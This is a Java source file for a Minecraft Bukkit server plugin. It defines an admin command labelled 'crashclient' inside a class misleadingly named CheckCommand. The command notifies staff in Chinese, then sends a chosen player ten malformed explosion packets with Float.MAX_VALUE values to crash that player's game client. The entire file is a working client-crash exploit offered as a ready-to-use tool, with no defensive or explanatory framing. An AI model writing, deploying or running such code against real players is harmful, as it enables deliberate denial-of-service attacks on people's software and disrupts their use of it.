package com.emptyirony.networkmanager.network.command;

import com.emptyirony.networkmanager.NetworkManager;
import com.emptyirony.networkmanager.bungee.util.CC;
import com.emptyirony.networkmanager.packet.PacketStaffMsg;
import com.qrakn.honcho.command.CPL;
import com.qrakn.honcho.command.CommandMeta;
import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.PlayerConnection;
import net.minecraft.server.v1_8_R3.Vec3D;
import org.bukkit.Location;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.ArrayList;

/**
 * 2 * @Author: EmptyIrony
 * 3 * @Date: 2020/3/9 16:01
 * 4
 */
@CommandMeta(label = "crashclient", permission = "panshi.admin", async = true)
public class CheckCommand {
    public void execute(Player player, @CPL("player") Player target) {
        PacketStaffMsg packetStaffMsg = new PacketStaffMsg(player.getName(), CC.translate("&8" + player.getName() + "&7 尝试崩溃 &8" + target.getName() + "&7 的客户端"), 2);
        NetworkManager.getInstance().getPidgin().sendPacket(packetStaffMsg);

        Location location = target.getLocation();
        PacketPlayOutExplosion crashPacket = new PacketPlayOutExplosion(location.getX(), location.getY(), location.getZ(), Float.MAX_VALUE, new ArrayList<>(), new Vec3D(Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE));
        PlayerConnection connection = ((CraftPlayer) target).getHandle().playerConnection;

        for (int i = 0; i < 10; i++) {
            connection.sendPacket(crashPacket);
        }
    }
}
